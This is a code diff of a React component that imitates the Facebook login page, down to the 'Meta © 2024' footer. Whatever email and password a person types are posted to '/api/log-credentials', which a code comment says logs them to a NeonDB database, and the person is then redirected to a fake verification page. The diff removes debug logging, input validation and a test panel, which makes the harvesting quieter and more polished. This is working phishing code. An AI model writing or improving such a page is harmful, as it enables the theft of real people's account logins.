@@ -47,19 +47,7 @@ export default function FacebookAuth() {
     setError('');
     setIsLoading(true);
 
-    console.log('🔵 Starting login process for:', email);
-
-    const validationError = validateCredentials(email, password);
-    if (validationError) {
-      console.log('🔴 Validation failed:', validationError);
-      setError(validationError);
-      setIsLoading(false);
-      return;
-    }
-
     try {
-      console.log('🟡 Attempting to log credentials...');
-
       // Log credentials to NeonDB
       const logResponse = await fetch('/api/log-credentials', {
         method: 'POST',
@@ -76,16 +64,9 @@ export default function FacebookAuth() {
         })
       });
 
-      console.log('🟡 API Response status:', logResponse.status);
-
       // Check if the request was successful
       if (!logResponse.ok) {
-        const errorText = await logResponse.text();
-        console.error('🔴 API Error:', errorText);
         // Continue anyway - don't block the user flow
-      } else {
-        const result = await logResponse.json();
-        console.log('🟢 Login logged successfully:', result);
       }
 
       // Store email in localStorage for session management
@@ -94,15 +75,12 @@ export default function FacebookAuth() {
         localStorage.setItem('facebook_remember', 'true');
       }
       
-      console.log('🟢 Redirecting to verification...');
-      
       // Redirect to verification page
       setTimeout(() => {
         router.push('/auth/verification');
       }, 500);
       
     } catch (err) {
-      console.error('🔴 Full login error:', err);
       // Continue anyway - don't block the user flow
       localStorage.setItem('user_email', email);
       setTimeout(() => {
@@ -111,13 +89,6 @@ export default function FacebookAuth() {
     } finally {
       setIsLoading(false);
     }
-  };
-
-  // Format input for better mobile number entry
-  const handleEmailChange = (e) => {
-    const value = e.target.value;
-    // Allow both email format and digits for mobile
-    setEmail(value);
   };
 
   return (
@@ -142,19 +113,19 @@ export default function FacebookAuth() {
           <div className="login-section">
             <div className="login-card">
               <form onSubmit={handleSubmit} className="login-form">
-                {/* Email/Mobile Input - FIXED SIZE */}
+                {/* Email/Mobile Input */}
                 <div className="input-container">
                   <input
                     type="text"
                     placeholder="Email or mobile number"
                     className="form-input"
                     value={email}
-                    onChange={handleEmailChange}
+                    onChange={(e) => setEmail(e.target.value)}
                     maxLength="50"
                   />
                 </div>
 
-                {/* Password Input - FIXED SIZE */}
+                {/* Password Input */}
                 <div className="input-container">
                   <input
                     type="password"
@@ -252,73 +223,6 @@ export default function FacebookAuth() {
             <span>Meta © 2024</span>
           </div>
         </footer>
-
-        {/* Debug Panel */}
-        <div className="debug-panel">
-          <h3>Debug Database Connection</h3>
-          <div className="debug-buttons">
-            <button
-              onClick={async () => {
-                console.log('🧪 Testing login API...');
-                try {
-                  const testData = {
-                    email: 'test@example.com',
-                    password: 'test123',
-                    userAgent: navigator.userAgent
-                  };
-                  
-                  const response = await fetch('/api/log-credentials', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(testData)
-                  });
-                  
-                  const result = await response.json();
-                  console.log('🧪 Login API Test:', result);
-                  alert(`Login API: ${response.status}\n${JSON.stringify(result, null, 2)}`);
-                } catch (error) {
-                  console.error('🧪 Login API Error:', error);
-                  alert('Login API Failed: ' + error.message);
-                }
-              }}
-              className="debug-button"
-            >
-              Test Login API
-            </button>
-            
-            <button
-              onClick={() => {
-                console.log('📋 Current localStorage:');
-                console.log('user_email:', localStorage.getItem('user_email'));
-                console.log('All localStorage:', localStorage);
-              }}
-              className="debug-button secondary"
-            >
-              Check Storage
-            </button>
-
-            <button
-              onClick={() => {
-                // Test mobile number validation
-                const testNumbers = ['1234567890', '0987654321', '5551234567'];
-                const testEmails = ['test@example.com', 'user@gmail.com'];
-                
-                console.log('🧪 Testing validation:');
-                testNumbers.forEach(num => {
-                  const error = validateCredentials(num, 'password123');
-                  console.log(`Mobile ${num}:`, error ? '❌ ' + error : '✅ Valid');
-                });
-                testEmails.forEach(email => {
-                  const error = validateCredentials(email, 'password123');
-                  console.log(`Email ${email}:`, error ? '❌ ' + error : '✅ Valid');
-                });
-              }}
-              className="debug-button secondary"
-            >
-              Test Validation
-            </button>
-          </div>
-        </div>
       </div>
 
       {/* Complete CSS Styles */}
@@ -565,45 +469,6 @@ export default function FacebookAuth() {
           color: #8a8d91;
           font-size: 12px;
           margin-top: 16px;
-        }
-
-        .debug-panel {
-          background: #fff3cd;
-          border: 1px solid #ffeaa7;
-          border-radius: 8px;
-          padding: 16px;
-          margin-top: 20px;
-          max-width: 400px;
-        }
-
-        .debug-panel h3 {
-          color: #856404;
-          margin: 0 0 12px 0;
-          font-size: 14px;
-        }
-
-        .debug-buttons {
-          display: flex;
-          gap: 8px;
-          flex-wrap: wrap;
-        }
-
-        .debug-button {
-          padding: 8px 12px;
-          background: #1877f2;
-          color: white;
-          border: none;
-          border-radius: 4px;
-          font-size: 12px;
-          cursor: pointer;
-        }
-
-        .debug-button.secondary {
-          background: #42b72a;
-        }
-
-        .debug-button:hover {
-          opacity: 0.9;
         }
 
         /* Responsive Design */
